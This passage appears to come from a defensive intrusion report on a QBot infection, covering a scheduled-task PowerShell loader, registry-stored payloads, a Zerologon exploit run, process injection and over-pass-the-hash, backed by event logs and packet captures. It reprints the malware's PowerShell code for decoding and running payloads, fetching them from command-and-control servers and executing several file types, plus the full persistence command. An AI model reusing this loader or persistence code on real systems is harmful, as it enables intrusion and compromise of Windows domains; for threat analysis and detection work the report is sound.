Script\nDescription: The image displays a screenshot of a Windows Registry Editor window, showcasing three registry entries. Each entry has a value name, value type, and data. The entries appear to contain base64 encoded information, likely related to the QBot malware, as indicated by the context provided. The data represents encoded values that could be associated with the malware's configuration or payloads.\n```\n\nThe PowerShell script (triggered by the scheduled task) starts off a chain of events which is illustrated below:\n\n```image\nAlt: PowerShell Chain\nDescription: The image is a flowchart depicting the execution process of a PowerShell script related to QBot malware. It outlines the steps that occur after the script is triggered by a scheduled task. The flowchart includes key decision points, such as validating the registry key creation date, and actions taken based on whether the date is less than or greater than four hours. It highlights two possible paths: executing a local QBot payload or fetching a remote QBot payload. Each step illustrates commands and processes, such as using 'regsvr32.exe' for DLL execution and 'Start-Process' for executing various types of payloads.\nTranscription: |\n  1. Start PowerShell script via Scheduled task\n     └── 2. Validate registry-key creation date\n         ├── < 4 hours\n         │   └── 3. Execute local Qakbot payload in registry\n         │       └── regsvr32.exe $env:temp/<random>.dll\n         └── > 4 hours\n             └── 3. Fetch remote Qakbot payload\n                 └── https://QbotIP/zk?r=n=kfdopi828182\n                     ├── regsvr32.exe $env:temp/<random>.dl\n                     ├── Start-Process $env:temp/<random>.exe\n                     ├── IEX(payload)\n                     └── cmd /c payload\n                     ├── Start-Process $env:temp/<random>.bat\n                     └── Start-Process $env:temp/<random>.vbs\n```\n\nWhen run for the first time, the script creates a new registry key entry in the same path, saving the date of execution. It then verifies upon execution if the creation date key of this registry key is older than 4 hours.\n\n```image\nAlt: Registry Key\nDescription: The image depicts a section of PowerShell script code. It includes a function named 'EjSok()', which retrieves an item property from a specified registry path. The script checks if the registry entry exists and retrieves the date associated with it. It also contains logic to determine if the current date exceeds a threshold of four hours from the retrieved date. The code highlights operations related to registry manipulation and date comparisons, relevant to the analysis of malware behavior.\nTranscription: |\n  function EjSok() {\n      $XtqpDJ = (Get-ItemProperty -Path $tvDQBlr).$WQudUrNwDr\n      if (! $XtqpDJ) {\n          return 1\n      }\n      $vRONdfU = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($XtqpDJ))\n      $JfKiixa = Get-Date -Date $vRONdfU\n      $JfKiixa = $JfKiixa.AddHours(4)\n      if ((Get-Date) -gt $JfKiixa) {\n      }\n      return 2\n  }\n```\n\nBased on the outcome, it will either: (1) retrieve the base64-encoded Qbot payload from the Windows Registry, decode it, save it on the file system and execute it.\n\n```image\nAlt: Qbot Payload\nDescription: The image displays a snippet of PowerShell code related to the execution of a malicious DLL. The code includes functions and commands for generating random file names, retrieving encoded data from the Windows Registry, decoding it from base64 format, and executing the DLL using 'regsvr32.exe'. This snippet is part of a larger analysis of the QBot malware's behavior and demonstrates the technical details involved in its execution.\nTranscription: |\n  function UQTV()\n  {\n      $MvmmBxnVj0 = Get-Random\n      $RBnYwaG = (Get-ItemProperty -Path $tvDQbLr).$LngwgFRytJ\n      if ($RBnYwaG) {\n          $_f_zhkPw = \"$env:TEMP\\($MvmmBxnVj0)1.dll\"\n          $fPsS = [System.Convert]::FromBase64String($RBnYwaG)\n          [System.IO.File]::WriteAllBytes($_f_zhkPw, $fPsS)\n          Start-Process -FilePath \"regsvr32.exe\" -ArgumentList \"$_f_zhkPw\"\n      }\n  }\n```\n\nOR (2) Fetch the QBot payload remotely using one of the active C2 IPs using the `Invoke-WebRequest` PowerShell module:\n\n```image\nAlt: Invoke-WebRequest\nDescription: The image depicts a snippet of PowerShell code, which is part of a function that initiates a web request to a dynamically constructed URL. The code includes variables for the URL and utilizes the `Invoke-WebRequest` cmdlet to fetch content, with error handling for different response headers. This script is relevant to the analysis of QBot malware, highlighting the method of retrieving payloads via command-and-control (C2) infrastructure.\nTranscription: |\n  function __NOxzyOQT([string]$RGNDm)\n  {\n      $ekanByiPK = \"https://$($RGNDm)$($d_IP)?n=$($PgZYjDK)\"\n      try\n      {\n          $kArvTQZY = Invoke-WebRequest -UseBasicParsing -Uri $ekanByiPK -DisableKeepAlive\n          $zCdUzfmhD = $kArvTQZY.StatusCode\n          if ($kArvTQZY.Headers.'Content-Type') {\n              $JACjQ = $kArvTQZY.Content\n          } else {\n              $JACjQ = [System.Text.Encoding]::ASCII.GetString($kArvTQZY.Content)\n          }\n      }\n  }\n```\n\nThe PS script contains built-in logic to execute various types of payloads including batch and Visual Basic files.\n\n```image\nAlt: Payload Execution\nDescription: The image displays a segment of PowerShell script code, showcasing various commands and functions used for executing payloads associated with the QBot malware. The code includes base64 decoding, file writing operations, and process execution commands, indicating a malware execution chain that retrieves and runs encoded malicious files. Specific variables and methods are highlighted, demonstrating the technical aspects of the malware's functionality.\nTranscription: |\n  switch ($UMMtDg[0])\n  {\n      0 {\n      }\n      1 {\n      }\n      2 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).dll\"\n          $ZCeNBLpm = [System.Convert]::FromBase64String($UMMtDg[2])\n          [System.IO.File]::WriteAllBytes($hHlJSNzeM, $ZCeNBLpm)\n          Start-Process -FilePath \"regsvr32.exe\" -ArgumentList \"$($hHlJSNzeM)\"\n      }\n      3 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).exe\"\n          $ZCeNBLpm = [System.Convert]::FromBase64String($UMMtDg[2])\n          [System.IO.File]::WriteAllBytes($hHlJSNzeM, $ZCeNBLpm)\n          Start-Process \"$($hHlJSNzeM)\"\n      }\n      4 {\n          $BpLv = IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2])))\n      }\n      5 {\n          $geLrhCE = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2]))\n          Start-Process cmd.exe \"/c $geLrhCE\"\n      }\n      6 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).bat\"\n          $ZCeNBLpm = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2]))\n          $ZCeNBLpm | Out-File -Encoding ASCII -FilePath $hHlJSNzeM\n          Start-Process \"$($hHlJSNzeM)\"\n      }\n      7 {\n          $hHlJSNzeM = \"$env:TEMP\\$( $MwmmBxnVj0).vbs\"\n          $ZCeNBLpm = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($UMMtDg[2]))\n          $ZCeNBLpm | Out-File -Encoding ASCII -FilePath $hHlJSNzeM\n          Start-Process \"$($hHlJSNzeM)\"\n      }\n  }\n```\n\nThe encoded QBot DLL that was stored in the registry, was dropped in the directory `%APPDATA%\\Roaming\\Microsoft\\Fdopitcu`. The unsigned DLL, with descriptor `Cancel Autoplay 2` was executed using `regsvr32.exe`.\n\n```image\nAlt: DLL Execution\nDescription: The image displays a Windows security audit log entry with details about a new process creation event. Key information included in the log are the Event Code, Process IDs, and the command line used for executing the 'regsvr32.exe' process. The log details the security and account information of the creator and target subjects, as well as the process information, including the parent process 'explorer.exe' and the specific command executed. This information is relevant for understanding the execution context of the QBot malware.\nTranscription: |\n  LogName: Security\n  EventCode: 4688\n  EventType: 0\n  ComputerName: <redacted>\n  SourceName: Microsoft Windows security auditing.\n  Type: Information\n  RecordNumber: 38489\n  Keywords: Audit Success\n  TaskCategory: Process Creation\n  OpCode: Info\n  Message: A new process has been created.\n  \n  Creator Subject:\n      Security ID: S-1-5-21-853439379-3680187918-914098032-1115\n      Account Name: <redacted>\n      Account Domain:\n      Logon ID: 0x741A48\n  \n  Target Subject:\n      Security ID: S-1-0-0\n      Account Name:\n      Account Domain: -\n      Logon ID: 0x0\n  \n  Process Information:\n      New Process ID: 0x1758\n      New Process Name: C:\\Windows\\SysWOW64\\regsvr32.exe\n      Token Elevation Type: %%1936\n      Mandatory Label:\n      Creator Process ID: 0x1958\n      Creator Process Name: C:\\Windows\\SysWOW64\\explorer.exe\n      Process Command Line: regsvr32.exe -s \"C:\\Users\\<redacted>\\AppData\\Roaming\\Microsoft\\Fdopitcu\\qwkrfxgymv.dll\"\n```\n\nUpon execution of this second-stage DLL, various registry keys were created in `HKCU\\Software\\Microsoft\\Yerqbqokc`. In addition, a new instance of explorer.exe (32-bit) was started and injected into.\n\n```image\nAlt: Registry Keys\nDescription: The image depicts a flowchart illustrating the relationship between various registry keys and processes involved in the execution of a malicious DLL within a cybersecurity context. It shows multiple registry paths under 'HKCU\\\\Software\\\\Microsoft\\\\Yerqbqokc' highlighted in yellow, indicating their relevance to the QBot malware analysis. Additionally, the flowchart connects the `regsvr32.exe` process (with PID 2988) and the `explorer.exe` process (with PID 3916), indicating that `regsvr32.exe` loads a DLL from a specified user directory, which subsequently creates the `explorer.exe` process. The diagram serves to visualize the malware's behavior through registry manipulation and process execution.\nTranscription: |\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\e519a231\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\17737aec\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\d086727f\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\683a151a\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\15325a90\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\ad8e3df5\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\afcf1d89\n  HKCU\\Software\\Microsoft\\Yerqbqokc\\9a50cdc7\n  \n  [1] regsvr32.exe (PID: 2988)\n  [2] explorer.exe (PID: 3916)\n  \n  2656 LOADS\n  852 CREATE PROCESS\n  \n  C:\\Users\\***\\qwrfkxgymyv.dll\n```\n\nThe registry keys contain eight-character long hex strings for which we believe is part of the malware’s encrypted config.\n\n```image\nAlt: Registry Config\nDescription: The image displays a table with several columns related to Windows Registry entries. The columns include 'Value Name,' 'Value Type,' 'Data,' and 'Value Slack.' Each row represents a different registry key, showing various hexadecimal string values encoded in 'Data,' which are presumably linked to malware behavior. The 'Value Type' consistently lists 'RegBinary,' indicating the data is stored in binary form.\nTranscription: |\n  | Value Name | Value Type | Data                                                | Value Slack          |\n  | ---------- | ---------- | --------------------------------------------------- | -------------------- |\n  | sC5d6043   | RegBinary  | 61-06-2A-56-B2-94-BD-EA-F3-67-29-9F-3F-56-EB-17-... | 6F-66                |\n  | d05d20d0   | RegBinary  | 66-5C-5D-D0-3D-87-F6-1F-91-2A-54-33-4C-32-7...      | 00                   |\n  | d2139071   | RegBinary  | 6A-FF-71-4B-8D-8C-F7-3E-6B-11-F0-BD-8B-BA-...       | 00-80-68-46-09-00    |\n  | 6aaff714   | RegBinary  | AF-64-9B-02-05-AD-10-D5-45-28-C9-C5-8C-8...         | 00-53-00-68-00       |\n  | 17a7b89e   | RegBinary  | 26-13-19-3A-7C-1A-7F-24-7E-27-4F-27-...             | 00-00-00             |\n  | af1bdfb    | RegBinary  | 3B-8A-29-64-80-9A-64-80-9A-2D-CE-F8-2A-...          | 00-54-79-70-65-00    |\n  | 9a840fb5   | RegBinary  | 35-AE-8D-F6-9D-ED-47-D4-89-FB-6B-39-F8-...          | 00-18-87-09-00       |\n  | a8b5884b   | RegBinary  | 46-A7-DC-1B-3C-7A-93-7A-2D-7A-3A-...                | 45-00                |\n  | 574a6093   | RegBinary  | 38-4C-32-4C-2E-8C-52-2E-8B-44-18-1C-...             | 24-30-23-39-27-C9-42 |\n  | 45ffc7fd   | RegBinary  | EA-6A-32-4C-4E-2B-4E-2B-44-18-1C-10-D...            | 00-00-00             |\n  | 609490a1   | RegBinary  | 1A-25-2B-51-7F-15-BF-49-AF-39-42-...                | 34                   |\n  | 38f780f7   | RegBinary  | 6E-5B-7F-15-18-F5-1F-49-AF-39-42-...                | 34                   |\n  | 8831a05b   | RegBinary  | A6-9F-61-78-B6-72-0D-20-9A-B3-50-29-E5-EC-1E-BB...  | 34                   |\n```\n\n### Persistence\n\n#### Scheduled Task/Job – Scheduled Task On Beachhead\n\nThe scheduled task created by Qbot was set to run every 30 minutes and executes a base64 encoded payload stored in the Windows Registry.\n\n```\nschtasks.exe /Create /F /TN \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\" /TR \"cmd /c start /min \\\"\\\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\Pvoeooxf).yzbbvhhdypa))) \" /SC MINUTE /MO 30\n```\n\n```image\nAlt: Scheduled Task\nDescription: The image is a screenshot of a Windows Task Scheduler log entry detailing the registration of a scheduled task. It includes specific fields such as LogName, EventCode, EventType, ComputerName, User, Type, RecordNumber, and a message indicating that a user registered a scheduled task with a unique identifier. This information is relevant to understanding the persistence mechanism utilized by Qbot malware.\nTranscription: |\n  LogName: Microsoft-Windows-TaskScheduler/Operational\n  EventCode: 106\n  EventType: 4\n  ComputerName: <REDACTED>\n  User: NOT_TRANSLATED\n  SidType: 0\n  SourceName: Microsoft-Windows-TaskScheduler\n  Type: Information\n  RecordNumber: 2717\n  Keywords: None\n  TaskCategory: Task registered\n  OpCode: Info\n  Message: User <REDACTED> registered Task Scheduler task \"{97F2F70B-10D1-4447-A2F3-9B070C86E261}\"\n```\n\n```\nLogName: Microsoft-Windows-TaskScheduler/Operational\nEventCode: 106\nMessage: Task scheduler Task Registered\n```\n\n### Privilege Escalation\n\nThirty minutes after gaining initial access, the threat actors ran an executable file on the beachhead to exploit CVE-2020-1472, Zerologon.\n\nThe executable was named “cool.exe”:\n\n```\nC:\\Windows\\system32\\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c \"taskkill /f /im explorer.exe\"\n```\n\n```image\nAlt: cool.exe\nDescription: |\n  The image is a screenshot of a command-line interface displaying details about a process executed on a Windows system. It includes the\n  - UtcTime: timestamp of the event\n  - ProcessGuid: unique identifier of the process\n  - ProcessId: identifier number of the running process\n  - Image: path to the executable file (cmd.exe)\n  - Description: indicates it is the Windows Command Processor\n  - CommandLine: shows the command used to run the executable, which includes the path to cmd.exe, the execution of 'cool.exe', and a command to terminate explorer.exe.\n  - It also displays placeholders for the Domain Controller IP, Domain name, and Administrator credentials used in the command. This image is relevant to the context, providing technical insights into the process involved in the exploit.\nTranscription: |\n  UtcTime:\n  ProcessGuid: {6634681a-92da-6192-a412-000000000500}\n  ProcessId: 8672\n  Image: C:\\Windows\\SysWOW64\\cmd.exe\n  FileVersion:\n  Description: Windows Command Processor\n  Product: Microsoft® Windows® Operating System\n  Company: Microsoft Corporation\n  OriginalFileName: Cmd.Exe\n  CommandLine: C:\\Windows\\system32\\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c \"taskkill /f /im explorer.exe\"\n  CurrentDirectory:\n```\n\nThree milliseconds after the Zerologon exploit, an event 4742 “A computer account was changed.” was generated on the targeted Domain Controller.\n\nAs explained in a detailed blog from CrowdStrike, the ZeroLogon CVE relies on the AES-CFB8 algorithm used with a zero IV:\n\n> “In order to use AES-CFB8 securely, a random initialization vector (IV) needs to be generated for every plaintext to be encrypted using the same key. However, the ComputeNetlogonCredential function sets the IV to a fixed value of 16 zero bytes. This results in a cryptographic flaw in which encryption of 8-bytes of zeros could yield a ciphertext of zeros with a probability of 1 in 256. Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren’t rejected by servers (by default). The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.”\n\nAs we can see on the network captures, a brute-force attack was performed in order to spoof the identity of the domain controller:\n\n```image\nAlt: Brute Force\nDescription: The image depicts network traffic logs related to the RPC_NETLOGON protocol. It shows multiple entries for authentication requests and responses, particularly noting 'STATUS_ACCESS_DENIED' for several attempts, indicating failed authentication attempts. Some lines highlight issues such as 'TCP Spurious Retransmission' and 'TCP Previous segment not captured,' which suggest network anomalies. The overall context is related to a brute-force attack scenario where access to the Domain Controller is being attempted.\nTranscription: |\n  Protocol          Info\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      [TCP Spurious Retransmission] NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      [TCP Previous segment not captured] NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n```\n\nAfter the end of the brute force traffic, we can see a single instance where the exploit has completed successfully.\n\n```image\nAlt: Exploit Success\nDescription: The image displays a network packet capture from a cybersecurity analysis tool. It shows a single frame containing detailed information about a malformed packet related to the Microsoft Network Logon protocol. Key aspects include the Ethernet II source and destination ports, the operation type (NetrServerPasswordSet2), and the timestamp, which appears incorrectly set to 'Dec 31, 1969'. The report also highlights an error indicating a malformed packet, with an associated error level marked as 'Error' and a severity level of 'Error', suggesting that there was an exception during packet processing.\nTranscription: |\n  Frame 938101: 94 bytes on wire (752 bits), 94 bytes captured (752 bits)\n  Ethernet II, Src:\n  Internet Protocol\n  Transmission Control Protocol, Src Port: 49675, Dst Port: 61579, Ack: 41675, Len: 40\n  Distributed Computing Environment / Remote Procedure Call (DCE/RPC) Response, Fragment: Single, FragLen: 40, Call: 548, Ctx: 0, [Req: #938017]\n  Microsoft Network Logon, NetrServerPasswordSet2 (30)\n      Request in frame: 938017\n      AUTHENTICATOR: return_authenticator\n          Referent ID: 0xdd55e901\n          Credential: 080ade8600000000\n          Timestamp: (0)Dec 31, 1969 19:00:00.000000000 EST\n  [Malformed Packet: RPC_NETLOGON]\n      [Expert Info (Error/Malformed): Malformed Packet (Exception occurred)]\n      [Malformed Packet (Exception occurred)]\n      [Severity level: Error]\n      [Group: Malformed]\n```\n\nAfter being successfully authenticated, the DC password was set:\n\n```image\nAlt: DC Password\nDescription: The image is a screenshot of an XML log entry from Microsoft Windows security auditing. It contains detailed information about a security event identified by Event ID 4742, which indicates that a computer account was changed. Key data points include the target username, target domain name, subject username ('ANONYMOUS LOGON'), and the timestamp of the event. The XML structure delineates various attributes associated with the event, providing a technical overview of the changes made to the computer account.\nTranscription: |\n  <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n    <System>\n      <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-a5ba-3e3b0328c30d}\"/>\n      <EventID>4742</EventID>\n      <Version>0</Version>\n      <Level>0</Level>\n      <Task>13825</Task>\n      <Opcode>0</Opcode>\n      <Keywords>0x8020000000000000</Keywords>\n      <TimeCreated SystemTime=\"T17:03:25.2463168Z\"/>\n      <EventRecordID>13249</EventRecordID>\n      <Execution ProcessID=\"644\" ThreadID=\"224\"/>\n      <Channel>Security</Channel>\n      <Computer>...</Computer>\n    </System>\n    <EventData>\n      <Data Name=\"ComputerAccountChange\">...</Data>\n      <Data Name=\"TargetUserName\">...</Data>\n      <Data Name=\"TargetDomainName\">...</Data>\n      <Data Name=\"TargetSid\">S-1-5-7</Data>\n      <Data Name=\"SubjectUserSid\">S-1-5-7</Data>\n      <Data Name=\"SubjectUserName\">ANONYMOUS LOGON</Data>\n      <Data Name=\"SubjectDomainName\">NT AUTHORITY</Data>\n      <Data Name=\"PrivilegeList\">...</Data>\n      <Data Name=\"SubjectLogonId\">0x3e6</Data>\n      <Data Name=\"SamAccountName\">...</Data>\n      <Data Name=\"DisplayName\">...</Data>\n      <Data Name=\"HomeDirectory\">...</Data>\n      <Data Name=\"HomePath\">...</Data>\n      <Data Name=\"ScriptPath\">...</Data>\n      <Data Name=\"ProfilePath\">...</Data>\n      <Data Name=\"UserWorkstations\">...</Data>\n      <Data Name=\"PasswordLastSet\">5:03:25 PM</Data>\n      <Data Name=\"UserAccountExpires\">...</Data>\n      <Data Name=\"PrimaryGroupId\">...</Data>\n      <Data Name=\"HomeDirectory\">...</Data>\n      <Data Name=\"OldValue\">...</Data>\n      <Data Name=\"UserAccountControl\">...</Data>\n      <Data Name=\"SidHistory\">...</Data>\n      <Data Name=\"LogonHours\">...</Data>\n      <Data Name=\"DnsHostName\">...</Data>\n      <Data Name=\"ServicePrincipalNames\">...</Data>\n    </EventData>\n  </Event>\n```\n\nThe `PasswordLastSet` field is equal to the `TimeCreated` field, meaning that the password of the domain controller was successfully updated. We can also see that the `SubjectUserName` is `ANONYMOUS LOGON`.\n\nA connection was performed from the beachhead to the Domain Controller using the DC account. After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain.\n\n```image\nAlt: Domain Admin Hash\nDescription: The image displays a Windows Event Log entry (Event 7045) from the Service Control Manager. It provides details about a service that was installed on the system. The log includes the following key information: the service name 'LMMCP00MEDEFHBDAMBML', the service file name which is a PowerShell command to reset the computer's machine password, the service type classified as a user mode service, the service start type labeled as 'demand start', and the service account specified as 'LocalSystem'. This information is relevant for analyzing potential unauthorized service installations and security breaches.\nTranscription: |\n  Event 7045, Service Control Manager\n  \n  General\n  Details\n  \n  A service was installed in the system.\n  Service Name: LMMCPOOMEDEFHBDAAMBML\n  Service File Name: powershell.exe -c Reset-ComputerMachinePassword\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\n```\n\nThe explorer shell was also restarted by the threat actor:\n\n```image\nAlt: Explorer Restart\nDescription: The image displays a Windows Event Viewer screenshot showing Event ID 7045, which indicates that a new service was installed on the system. It includes details such as the service name (ANFDHCOCLIICFDIPINAD), the service file name (a command to execute ‘taskkill’), the service type (user mode service), the start type (demand start), and the service account (LocalSystem). This information is relevant in the context of monitoring system changes and potential malicious activities.\nTranscription: |\n  Event 7045, Service Control Manager\n  \n  A service was installed in the system.\n  Service Name: ANFDHCOCLIICFDIPINAD\n  Service File Name: %COMSPEC% /C \"taskkill /f /im explorer.exe\"\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\n```\n\n### Defense Evasion\n\nUpon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process.\n\n```image\nAlt: Process Hollowing\nDescription: The image displays a log entry related to a security event in a Windows environment. It includes various fields such as LogName, EventCode, EventType, ComputerName, SourceName, and details about the process creation event. Key information includes the Creator Subject's Security ID and Logon ID, the Target Subject's Security ID, and the Process Information detailing the New Process ID, New Process Name, and Command Line. This log entry specifically indicates that a new process has been created, providing insight into potential suspicious activity related to process creation.\nTranscription: |\n  LogName=Security\n  EventCode=4688\n  EventType=0\n  ComputerName=\n  SourceName=Microsoft Windows security auditing.\n  Type=Information\n  RecordNumber=38250\n  Keywords=Audit Success\n  TaskCategory=Process Creation\n  OpCode=Info\n  Message=A new process has been created.\n  \n  Creator Subject:\n      Security ID:\n      Account Name:\n      Account Domain:\n      Logon ID: 0x741A48\n  \n  Target Subject:\n      Security ID: S-1-0-0\n      Account Name: -\n      Account Domain: -\n      Logon ID: 0x0\n  \n  Process Information:\n      New Process ID: 0x1958\n      New Process Name: C:\\Windows\\SysWOW64\\explorer.exe\n      Token Elevation Type: %%1936\n      Mandatory Label: S-1-16-8192\n      Creator Process ID: 0x32b4\n      Creator Process Name: C:\\Windows\\SysWOW64\\rundll32.exe\n      Process Command Line: C:\\Windows\\SysWOW64\\explorer.exe\n```\n\nThe injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit). An example event can be seen below. Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication.\n\n```image\nAlt: Cobalt Strike Communication\nDescription: The image displays a log entry from the Microsoft Windows Sysmon (System Monitor) detailing a process access event. It includes various information fields such as EventCode, EventType, ComputerName, and specifics about the Source and Target processes involved in a Dynamic-link Library (DLL) injection technique. Key details highlighted include SourceProcessId (10492) and TargetProcessId (4072), both referencing instances of explorer.exe. The log also mentions the technique ID (T1055.001), indicating that this relates to process injection methods, which is relevant to cyber threat intelligence.\nTranscription: |\n  LogName=Microsoft-Windows-Sysmon/Operational\n  EventCode=10\n  EventType=4\n  ComputerName=DESKTOP-XXXXXXX\n  User=NOT_TRANSLATED\n  Sid=S-1-5-18\n  SidType=0\n  SourceName=Microsoft-Windows-Sysmon\n  Type=Information\n  RecordNumber=38015\n  Keywords=None\n  TaskCategory=Process accessed (rule: ProcessAccess)\n  OpCode=Info\n  Message=Process accessed:\n  RuleName: technique_id=T1055.001, technique_name=Dynamic-link Library Injection\n  UtcTime: [REDACTED]\n  SourceProcessGUID: {6634681a-8d6d-6192-3312-000000000500}\n  SourceProcessId: 10492\n  SourceThreadId: 11956\n  SourceImage: C:\\Windows\\SysWOW64\\explorer.exe\n  TargetProcessGUID: {6634681a-9429-6192-c412-000000000500}\n  TargetProcessId: 4072\n  TargetImage: C:\\Windows\\SysWOW64\\explorer.exe\n  GrantedAccess: 0x1FFFFF\n```\n\n#### Over-Pass-the-Hash from Beachhead\n\nThe threat actor obtained the NTLM hash value of the administrator account through the Zerologon exploit and used over-pass-the-hash to request a TGT from the domain controller. We have seen the use of over-pass-the-hash several times before. For example, our Cobalt Strike Defender Guide covers detection of this technique in more detail.\n\n```image\nAlt: Over-Pass-the-Hash\nDescription: The image displays the properties of a security event (Event ID 4624) from a Microsoft Windows security auditing log. It details a successful logon event, including information such as the Security ID, Account Name, Logon Type, and Process Information. The log outlines the account that was logged on, the associated security identifiers, and details about the logon process, including the source address and the authentication package used.\nTranscription: |\n  Event Properties - Event 4624, Microsoft Windows security auditing.\n  \n  General\n  Details\n  \n  An account was successfully logged on.\n  \n  Subject:\n    Security ID: S-1-5-21-853439379-3680187918-914098032-1115\n    Account Name:\n    Account Domain:\n    Logon ID: 0x39D591C\n  \n  Logon Information:\n    Logon Type: 9\n    Restricted Admin Mode: -\n    Virtual Account: No\n    Elevated Token: No\n  \n  Impersonation Level: Impersonation\n  \n  New Logon:\n    Security ID: S-1-5-21-853439379-3680187918-914098032-1115\n    Account Name:\n    Account Domain:\n    Logon ID: 0x39E88DB\n    Linked Logon ID: 0x0\n    Network Account Name: Administrator\n    Network Account Domain:\n    Logon GUID: {00000000-0000-0000-0000-000000000000}\n  \n  Process Information:\n    Process ID: 0xaf4\n    Process Name: C:\\Windows\\System32\\svchost.exe\n  \n  Network Information:\n    Workstation Name:\n    Source Network Address: ::1\n    Source Port: 0\n  \n  Detailed Authentication Information:\n    Logon Process: seclog\n    Authentication Package: Negotiate\n    Transited Services:\n    Package Name (NTLM only): -\n    Key Length: 0\n```\n\nSoon after, a TGT for the administrator account was requested:\n\n```image\nAlt: TGT Request\nDescription: The image displays a screenshot of the Event Properties for Event ID 4768, indicating a request for a Kerberos authentication ticket (TGT). It contains detailed information about the account making the request (Administrator), the service involved (krbtgt), and the associated network information including client address and port. Additional details on ticket options, result code, ticket encryption type, and pre-authentication type are also provided, making it a relevant and informative resource for analyzing authentication requests in a cybersecurity context.\nTranscription: |\n  Event Properties - Event 4768, Microsoft Windows security auditing.\n  \n  General\n  Details\n  \n  A Kerberos authentication ticket (TGT) was requested.\n  \n  Account Information:\n  - Account Name: Administrator\n  - Supplied Realm Name:\n  - User ID: S-1-5-21-853439379-3680187918-914098032-500\n  \n  Service Information:\n  - Service Name: krbtgt\n  - Service ID: S-1-5-21-853439379-3680187918-914098032-502\n  \n  Network Information:\n  - Client Address: :::ffff:10.155.25.134\n  - Client Port: 61689\n  \n  Additional Information:\n  - Ticket Options: 0x40810010\n  - Result Code: 0x0\n  - Ticket Encryption Type: 0x12\n  - Pre-Authentication Type: 2\n  \n  